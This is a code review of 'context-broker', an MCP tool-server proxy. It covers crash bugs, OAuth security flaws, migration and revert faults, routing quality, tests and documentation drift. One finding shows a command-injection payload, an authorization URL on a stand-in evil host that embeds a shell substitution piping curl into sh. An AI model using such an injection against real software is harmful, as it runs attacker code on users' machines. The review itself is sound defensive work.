# context-broker — Project Review

Reviewed: `src/`, `scripts/`, `config/`, tests, packaging, docs, and the uncommitted working-tree changes (OAuth auto-discovery, config hot-reload, spawn-signature respawn).

State at review time: `npm run build` is clean and `npm test` passes (5 suites, 132 tests).

## Resolution status

Everything below was addressed in the follow-up change unless listed here.

**Not done (deliberately):**
- **Migrating `ProcessManager` / `oauth.ts` onto the SDK's `Client`, transports and `OAuthClientProvider`.** Kept as a possible follow-up. Instead, each bug it would have removed was fixed in the hand-rolled code (and now has tests), which keeps behaviour stable for existing configs.
- **Project-scoped Claude servers** (`projects[path].mcpServers`) are still not migrated; this is now documented in the README and `migrate.mjs`.

**Done in the second follow-up:**
- **Tool-description index.** Activation records each server's tools in `tool-index.json`; `discover_tools` uses them (capped at +2) when routing.
- **Env isolation.** New per-server `inheritEnv` (`false` or a list with `PREFIX_*` globs); default is unchanged (full environment).
- **Cursor/OpenCode broker registration.** `migrate` registers the broker in each source client's own format; `revert` removes it.

**Review item that was wrong:** `ts-jest@29.4` already supports `jest@30` (peer range `^29 || ^30`), so no tooling change was needed.

**Verification:** `npm run build`, `npm test` (222 tests, including a migrate → session-sync → revert round trip and an OAuth flow against a fake authorization server), and a manual end-to-end run of the built broker over stdio (bad command → tool error without crashing, `tools/list_changed` on activate/deactivate/auto-activate).

---

## TL;DR

The idea is sound and the core loop works: lazy activation, `tools/list_changed` notifications, and splitting `SKILL.md` into a stub plus `INSTRUCTIONS.md` are good ideas. The code is readable and the `ProcessManager` tests are solid.

The main risks are in three areas:

1. **Robustness of the proxy.** One bad `command` in `servers.json` crashes the whole broker. Stdio tool calls time out after 10 seconds. Child processes leak when a handshake fails or two activations race.
2. **Security of the OAuth flow.** The browser is opened through a shell with a URL taken from remote metadata. The OAuth `state` is never checked. Tokens are written world-readable and keyed only by server name.
3. **Reversibility of the migration.** `session-sync.mjs` strips the `migratedFrom` marker, which silently breaks `revert --skills`. Revert also writes the wrong format back to OpenCode, and the migration edits user configs without making backups.

The biggest structural recommendation is to replace the hand-rolled JSON-RPC, SSE, and OAuth code with the MCP SDK's `Client` and transports. The SDK is already a dependency (v1.29), and switching would remove most of the bugs in the proxy and OAuth sections below.

---

## What's working well

- **Clear architecture.** Routing (`router.ts`, `skill-router.ts`), process lifecycle (`process-manager.ts`), and protocol surface (`index.ts`) are separated cleanly.
- **Per-child state** (pending requests, stdout buffer, request IDs keyed by `ChildProcess`) avoids cross-child ID collisions and listener leaks.
- **Pending requests are rejected** on both deactivation and unexpected exit, and both paths are tested.
- **`spawnSig` respawn** (uncommitted) is a nice touch: editing a server's command or env in `servers.json` takes effect on the next `activate_server` without restarting the broker.
- **`migrate-helpers.ts`** is well tested, including shell escaping and fish flag parsing, after several review rounds.
- **`--dry-run`** exists on both migrate and revert.

---

## Critical — fix first

### 1. A missing or misspelled `command` crashes the broker
`src/process-manager.ts:119-121` calls `spawn()` without an `'error'` listener. When the binary doesn't exist, Node emits `ENOENT` as an unhandled `'error'` event and the broker process exits, taking every active server with it. Reproduced:

```
[router] Activating server: bad
node:events:486  throw er; // Unhandled 'error' event
Error: spawn definitely-not-a-cmd-xyz ENOENT
```

Add `child.on("error", …)` that rejects the pending handshake and cleans up. Do the same for `child.stdin` (`EPIPE` when writing to a dead child).

### 2. Command injection in `openBrowser`
`src/oauth.ts:104-110` runs `execSync(\`open "${url}"\`)`. The URL is built from `authorization_endpoint`, which comes from the remote server's OAuth metadata. URL serialization does not encode `$`, `(`, `)` or `|`, so an endpoint like `https://evil.example/authorize$(curl…|sh)` survives and is evaluated by the shell inside the double quotes. Use `execFile("open", [url])` or `spawn` with no shell. This also only works on macOS. On Linux (`xdg-open`) and Windows (`start`) it falls back to printing the URL to stderr, which most MCP clients don't show, so the OAuth flow hangs silently for 5 minutes.

### 3. OAuth `state` is generated but never verified
`src/oauth.ts:430` creates `state`, but `:443` only reads `code`. The callback server also accepts any path (`:257`) and any local caller. Check `url.pathname === "/callback"` and compare `state` in constant time before accepting the code. The error branch also reflects `error` into HTML unescaped (`:270`).

### 4. Stdio tool calls time out after 10 seconds
`callTool` (`src/process-manager.ts:286-292`) calls `sendRequest` without a timeout, so it uses the default of `10_000` ms (`:544`). Any search, build, DB query, or LLM-backed tool that takes longer fails with `Request N timed out`. HTTP calls have the opposite problem: `fetch` has no `AbortSignal`, so they can hang forever. Make the timeout configurable per server (e.g. `toolTimeoutMs`) with a generous default, and apply it to both transports.

### 5. Child processes leak on failed or concurrent activation
- If `fetchTools` throws (handshake timeout, JSON-RPC error), the spawned child is never killed and its maps are never cleared (`src/process-manager.ts:177`). With the 600-second handshake timeout, a broken server sits there for 10 minutes and then leaks.
- Two concurrent `activate(name)` calls (parallel tool calls, or auto-activation racing `activate_server`) both pass the `has()` check before the first `await`. Both spawn, the second overwrites the first in `this.active`, and the first child is orphaned. The same race exists for HTTP, and in `getAccessToken` it opens two browser windows. Keep a `Map<string, Promise<MCPTool[]>>` of in-flight activations and return the existing promise.

### 6. `session-sync.mjs` silently breaks `revert --skills`
Revert finds user skills by `cfg.migratedFrom === label` (`scripts/revert-migration.mjs:205`). But the SessionStart hook rewrites every regular skill entry with `deriveEntry(entry, flatSkill)` and no `extra` (`scripts/session-sync.mjs:131, 148`), which drops `migratedFrom`. After the first new session, `revert --skills` reports "nothing to revert" and the user's `SKILL.md` files stay split. Preserve existing `migratedFrom` and `plugin` fields when updating an entry, and add a test for the round trip.

---

## High

### Proxy and protocol (`process-manager.ts`, `index.ts`)
- **Server-to-client messages are mishandled.** The stdout handler (`process-manager.ts:140-149`) resolves any message whose `id` matches a pending request, even if it is a *request from the server* (`ping`, `roots/list`, `sampling/createMessage`) that happens to reuse the same ID. Those requests are never answered, and server notifications such as `notifications/tools/list_changed` are dropped, so dynamic tool lists never refresh. Only treat a message as a response when it has no `method`.
- **Auto-activated servers are lost at startup.** The `autoActivate` loop (`index.ts:415-424`) runs before `server.connect()` (`:440`). `server.notification()` throws `Not connected` (SDK `protocol.js:790`), so every successful auto-activation is logged as "Failed to auto-activate". Worse, startup blocks for up to 600 seconds per server before the broker answers `initialize`, and the MCP client will likely time out. Connect first, then activate in the background.
- **`deactivate_server` doesn't send `tools/list_changed`** (`index.ts:286-292`), and neither does an unexpected child exit, so the client keeps advertising dead tools. It also reports "Deactivated" for unknown names.
- **Auto-activation of unknown tools has no error handling** (`index.ts:378-391`). If `activate` throws, the error escapes as a protocol error instead of a tool result. `getConfig(...)!` can also be `undefined`, because the reload happens *after* `select()` ran against the old config. In practice, clients only call tools they've been told about, so this path may be close to unreachable. Consider whether it is worth keeping, given it can kick off an OAuth browser flow or a `docker build` from a guessed tool name.
- **Tool name collisions are unhandled.** Two servers exposing `search` produce duplicate names in `ListTools`, and `findServerForTool` silently picks the first. Detect collisions and either prefix the name (`server__tool`) or refuse to activate the second server with a clear message.
- **Errors aren't flagged as errors.** Failures are returned as plain text content without `isError: true` (`index.ts:275-282, 403-409`, and the "Unknown server" branches), so the model can't reliably tell a failed call from a successful one.

### HTTP transport
- **The 401 retry reuses the same token.** On 401, `ensureHttpAuth(..., force=true)` calls `getAccessToken`, which returns the cached token whenever `expires_at` hasn't passed (`oauth.ts:396-413`). If the server revoked the token, the retry sends the identical token and fails again. Add a `forceRefresh` path that skips the cached access token.
- **A static `Authorization` header can be overwritten.** `callToolHttp` (`process-manager.ts:311`) doesn't check `config.headers?.Authorization`, unlike `activateHttp` (`:247`). A server configured with a static bearer token that returns 401 starts a browser OAuth flow and replaces the user's header.
- **The SSE handling is fragile.** `readMcpHttpResponse` buffers the whole body with `res.text()`, which never resolves on a long-lived stream. It takes the *last* `data:` line rather than the one whose `id` matches, and doesn't join multi-line `data:` fields.
- **Session lifecycle is incomplete.** The broker sends no `MCP-Protocol-Version` header (required from spec 2025-06-18), sends no `DELETE` on deactivate, and doesn't re-initialize on `404` when a session expires. `protocolVersion` is hard-coded to `2024-11-05`, which predates Streamable HTTP.
- **Extra `initialize` on every activation.** `serverRequiresOAuth` sends a full `initialize` to every HTTP server without a static header, which can create an orphan session. The 401-on-activate fallback already covers this case, so the probe can go.

**Recommendation:** `Client` + `StdioClientTransport` / `StreamableHTTPClientTransport` from `@modelcontextprotocol/sdk` handle request/response correlation, server requests, ping, timeouts, SSE, sessions, protocol negotiation, and OAuth (`OAuthClientProvider`). Migrating `ProcessManager` onto them fixes nearly every item in this section and most of the OAuth items below.

### OAuth storage and scoping (`oauth.ts`)
- **Tokens are world-readable.** They are written with the default umask (`:69-72`, `:84-87`), typically `0644`. Use `mode: 0o600` for files and `0o700` for the directories, or the macOS Keychain.
- **Tokens are keyed only by server name** (`:51-53`). If a server's `url` changes, the stored token is sent to the new host. Store the resource URL or issuer with the token and refuse to reuse it on a mismatch.
- **Every scope the AS supports is requested by default** (`scopes = meta.scopes_supported`, `:394`). That is over-broad. Prefer the `scope` from `WWW-Authenticate` or the protected-resource metadata, and send the RFC 8707 `resource` parameter, which the current MCP auth spec requires.
- **`redirect_uri` uses `localhost` but the listener binds `127.0.0.1`** (`:419` vs `:291`). On hosts where `localhost` resolves to `::1` first, the callback fails. RFC 8252 recommends the IP literal.
- **Ephemeral ports cause a new client registration on almost every re-auth.** A new port changes the redirect URI, so the cached client never matches (`:230-238`). Persist the port with the client and try to rebind it first.
- **Discovery is repeated on every call.** `discoverOAuthMeta` makes a network round trip on every `getAccessToken`, even with a valid cached token, and `registerDynamicClient` repeats it.

### Migration and revert scripts
- **No backups and non-atomic writes on user config files.** `~/.claude.json`, `~/.cursor/mcp.json`, `~/.claude/settings.json` and `~/.zshenv` are all rewritten in place (`migrate.mjs:281, 292, 309, 339, 560`). Claude Code writes `~/.claude.json` constantly while running. Write a timestamped `.bak` first, then write to a temp file and `rename`.
- **Plugin MCP servers are attributed to every source.** The plugin `.mcp.json` scan sits inside the per-source loop (`migrate.mjs:200-218`), so plugin HTTP servers get labeled "Migrated from cursor", "…claude", and "…opencode" in turn, with the last one winning. `revert --from cursor` can then write Slack's plugin server into `~/.cursor/mcp.json`. Scan plugins once and label them `plugin`.
- **The description doubles as the revert marker.** Migrated servers get `description: "Migrated from <label>"`, and revert matches on that exact string (`revert-migration.mjs:94`). Routing depends on good descriptions, so users *should* edit them, and doing so breaks revert. Use a `migratedFrom` field, as skills already do.
- **Revert writes the Claude format into OpenCode.** It always writes `{ mcpServers: {command, args, env} }` (`revert-migration.mjs:122-123`), but OpenCode uses `mcp` with a `command` array and `environment`.
- **Revert removes the broker unconditionally.** `context-broker` is deleted from `~/.claude.json` even for `revert --from cursor --servers` (`revert-migration.mjs:166-183`), leaving Claude's still-migrated servers unreachable.
- **Secrets in headers aren't extracted.** Only `env` values are scanned (`migrate.mjs:229-233`). A static `Authorization: Bearer …` header is copied into `servers.json` in plaintext.
- **Split skills are empty for other harnesses.** `splitSkillMd` leaves a frontmatter-only `SKILL.md` (`migrate.mjs:106-119`). Any harness that reads `SKILL.md` directly (Cursor, OpenCode, Claude Code slash-invocation) gets no instructions. Add a one-line body to the stub such as "Full instructions: `load_skill("<key>")` or `INSTRUCTIONS.md` next to this file."

---

## Medium

### Routing quality (`router.ts`, `skill-router.ts`)
- **Substring matching produces false positives.** Verified: `rank("improve the prompt for a digital express app")` returns `github` with score 4, because `git` matches "di**git**al" and `pr` matches "im**pr**ove"/"**pr**ompt". Tokenize the query and match whole words, or use `\b` boundaries. Multi-word keywords like "pull request" can stay phrase matches.
- **Punctuation breaks description matching.** Description words are split on whitespace only, so `"repositories,"` keeps its comma and only matches when the query also has one. Verified: `"list repositories"` scores 2, `"list repositories,"` scores 3. Split on `/\W+/`.
- **Description matches are scored but never shown.** They're missing from `reason`, so output can read "Keywords matched: " (empty) with a non-zero score.
- **Migrated servers all route the same way.** Every migrated server gets the description `Migrated from X`, so routing falls back entirely on a fixed 25-word keyword list. Consider pulling the server's own tool descriptions into an index on first activation, or prompting the user to describe each server during migration.
- **The scoring logic is copied** in `ToolRouter` and `SkillRouter`. Extract a shared `score(query, {description, keywords})`.
- **Reloads are inconsistent.** `reloadServersFromDisk` is called on `activate_server` but not on `discover_tools`, so discovery can list servers that activation can't find, or the reverse. A half-written `servers.json` throws outside any `try` (`index.ts:251`).
- **Skills are never reloaded.** `skills.json` is read once at startup, while `session-sync` rewrites it at SessionStart, which races with broker startup. A partially written file makes the top-level `JSON.parse` throw and the broker fail to start. Write it atomically and reload lazily.

### Config and input validation
- **No config or argument validation.** A server without `keywords` makes every `discover_tools` call throw (`config.keywords.filter`). Tool arguments are cast blindly (`args?.query as string`), so a missing argument throws inside `toLowerCase()`. `zod` is already a dependency but unused in `src/`. Use it to validate `servers.json` and `skills.json` at load time with errors that name the offending entry, and to validate meta-tool arguments.
- **Missing env vars become empty strings.** `resolveEnv` substitutes `""` for unset `${VAR}`s, so a missing `GITHUB_TOKEN` shows up as an obscure auth failure from the child. Log a warning naming the variable.
- **Every child gets the broker's full environment** (`{ ...process.env, ...env }`). Combined with the migration exporting all secrets globally from `~/.zshenv`, every MCP server, and every process the user starts, can read every other server's credentials. At minimum, document this. Better options are a dedicated env file loaded only by the broker, or the OS keychain.
- **The bundled fallback configs leak into real use.** `config/skills.json` points at `/mnt/skills/public/...`, which doesn't exist on user machines, and `config/servers.json` contains `/path/to/allowed/dir`. A user who hasn't created their own config silently gets these examples (`index.ts:59-62, 90-92`). Fall back to an empty registry with a clear log line instead.

### Benchmark
- **It understates the broker's idle cost.** Only 4 meta-tools are modeled (`benchmark.mjs:61-66`), while the real broker exposes 6.
- **HTTP servers are skipped** (`if (!cfg.command) continue`, `:99`), but the label still says "all N servers".
- **Every run is a cold cache write** (`--no-session-persistence`, single prompt). In a real multi-turn session the tool schemas are cached and read at roughly 10% of the price. The README's "$109.81 per 1,000 requests" is a first-turn number, not steady state. Add a multi-turn strategy, or qualify the claim.

---

## Low / nits

- **Hard-coded versions.** `"1.0.0"` appears in four places (server info and three `clientInfo`s). Read it from `package.json`.
- **Inconsistent log prefixes.** `process-manager.ts` logs as `[router]`. Use `[context-broker]` or `[process-manager]`.
- **Duplicate `__dirname`.** `index.ts` redeclares it inside `resolveConfigPath` and `resolveSkillsConfigPath`, shadowing the module-level one.
- **Dead code.** `ToolRouter.explain()` is unused.
- **Lost error details.** JSON-RPC error `code` and `data` are dropped (`process-manager.ts:145`).
- **Stray timers.** Timeout timers are never cleared after resolution. They're `unref()`'d, so this is harmless but noisy under fake timers.
- **Shell-dependent file discovery.** `find` is invoked via `execSync` with an interpolated path in three scripts. `fs.readdirSync(dir, { recursive: true })` is portable (Windows) and needs no shell.
- **Duplicated frontmatter parsing.** `migrate.mjs` and `session-sync.mjs` parse it differently: quote stripping, 120-char truncation, keyword counts 6 vs 8 vs 12, and `|` block scalars aren't handled. The same skill gets different descriptions depending on which script last touched it. Share one module.
- **Skill key collisions.** Skills with the same directory name in two sources (e.g. `~/.claude/skills/foo` and `~/.cursor/skills/foo`) collide, and the last one wins, including its `migratedFrom`.
- **Plugin enable/disable is asymmetric.** Migrate disables plugins matching *any* migrated server name, while revert re-enables only HTTP ones.
- **Only global Claude servers are migrated.** Servers under `projects[path].mcpServers` in `~/.claude.json` are ignored.
- **Reverted Cursor configs keep `${VAR}` literally.** Cursor's interpolation syntax is `${env:VAR}`, so the restored config contains unexpanded placeholders. Revert also leaves the extracted secrets in the shell file, which isn't documented.

---

## Packaging and tooling

- **The SDK version floor is wrong.** `"@modelcontextprotocol/sdk": "^1.0.0"`, but the code imports `discoverOAuthServerInfo` and `registerClient`, which don't exist in early 1.x. Pin the real minimum (1.29.0 is installed).
- **`zod` is listed but not imported** anywhere in `src/`. Either use it (see validation above) or drop it.
- **Mismatched test tooling.** `jest@30` is paired with `ts-jest@29`, whose peer range is jest 29. It works today, but bump `ts-jest` to a version that supports jest 30.
- **No Node version declared.** The code relies on global `fetch` and top-level await. Add `"engines": { "node": ">=18" }`.
- **No CI.** Add a GitHub Actions workflow that runs `npm ci && npm run build && npm test`, plus a type-check-only lint step.
- **`declaration: true`** in `tsconfig.json` is unnecessary for a CLI-only package and ships `.d.ts` files nobody consumes.

---

## Tests

The existing suites are good unit tests for what they cover. The gaps are in the riskiest code:

| Area | Coverage |
|---|---|
| `oauth.ts` (security-sensitive) | None |
| `index.ts` request handlers | None |
| `migrate.mjs` / `revert-migration.mjs` / `session-sync.mjs` (destructive) | None |
| `ToolRouter.reloadServersFromDisk` (new) | None |
| `setup.test.ts` | Placeholder (`expect(true).toBe(true)`) |

Suggested additions, in priority order:

1. **Migrate → session-sync → revert round trip** against a temp `HOME`. It would have caught the `migratedFrom` loss and the OpenCode format bug.
2. **OAuth with a local fake authorization server:** state mismatch rejected, forced refresh after 401, token file mode `0600`.
3. **`ProcessManager` failure paths:** spawn `ENOENT`, handshake failure kills the child, concurrent `activate` spawns once, server-to-client request with a colliding ID.
4. **Handler tests for `index.ts`.** Export a `createServer(deps)` factory so the handlers can be tested without stdio.
5. **Router tests that pin the intended behavior:** word boundaries and punctuation. The current tests encode the substring behavior, so they pass despite the bugs.

Minor: `afterEach(jest.restoreAllMocks)` doesn't restore `global.fetch`, because it's assigned directly. Save and restore it explicitly.

---

## Documentation drift

`CLAUDE.md` and `README.md` describe behavior that changed in `5dfe21a` ("register skills and commands in-place, no file moves"):

- **`CLAUDE.md`**
  - Says "No test suite currently exists", but there are 132 tests and `npm test`.
  - Lists `npm run migrate` as `node scripts/migrate.mjs`. It now runs `node dist/index.js migrate` and requires a build.
  - Says migrate "moves `~/.claude/skills/` … leaving symlinks", which it no longer does.
  - Doesn't mention `oauth.ts`, `migrate-helpers.ts`, `session-sync.mjs`, or HTTP servers.
- **`README.md`**
  - The intro and diagram say 4 meta-tools; there are 6.
  - Migration says it "skips … HTTP/SSE servers", but HTTP servers are migrated.
  - Skills migration and revert still describe moving directories and symlinks.
  - Install tells users to add `mcpServers` to `~/.claude/settings.json` under the name `broker`, while `migrate` registers `context-broker` in `~/.claude.json`. Following both yields two broker instances. Pick one location and one name.
  - Plugin revert mentions the old `split-skills` hook name.
- **Uncommitted README change.** The new `hq` example uses an internal hostname (`tech.hq.justworks.io`) in a public repo's README, and the same URL appears in `process-manager.test.ts`. Swap it for `https://mcp.example.com/mcp`.

---

## Suggested order of work

1. **Crash and safety fixes (small, high value):** spawn and stdin `'error'` handlers, kill the child on handshake failure, in-flight activation dedup, a configurable tool timeout, `execFile` for the browser, OAuth `state` and path checks, `0600` token files.
2. **Migration safety:** preserve `migratedFrom` in session-sync, a `migratedFrom` field for servers, backups plus atomic writes, a format-aware revert, and a round-trip test.
3. **Protocol correctness:** connect before auto-activating, `list_changed` on deactivate and exit, `isError` on failures, tool-name collision handling.
4. **Move `ProcessManager` and `oauth.ts` onto the SDK's `Client`, transports, and `OAuthClientProvider`.** This deletes the hand-rolled JSON-RPC, SSE, and OAuth code and most of the remaining HTTP and OAuth items.
5. **Routing quality:** tokenized matching, punctuation fix, shared scorer, better descriptions for migrated servers.
6. **Docs, packaging, and CI cleanup.**
